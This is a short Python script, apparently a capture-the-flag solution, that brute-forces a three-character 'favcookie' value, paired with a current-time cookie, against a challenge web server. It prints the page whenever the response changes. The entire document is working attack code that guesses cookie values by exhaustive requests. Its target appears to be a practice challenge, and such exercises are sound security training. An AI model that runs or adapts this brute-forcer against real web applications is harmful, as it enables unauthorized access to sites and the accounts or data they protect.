import requests
import string
from datetime import datetime

TARGET_URL="http://chall.eng.run:30688/"
res=requests.get(TARGET_URL)
test=res.text

def findCookie():
    for ch1 in string.digits+string.ascii_letters:
        for ch2 in string.digits+string.ascii_letters:
            for ch3 in string.digits+string.ascii_letters:
                time=datetime.utcnow()
                cookie={"favcookie":ch1+ch2+ch3, "time":str(time.hour)+"%3A"+str(time.minute)}
                res=requests.get(TARGET_URL,cookies=cookie)
                print(ch1+ch2+ch3)
                if(test!=res.text):
                    print(res.text)
                    break

findCookie()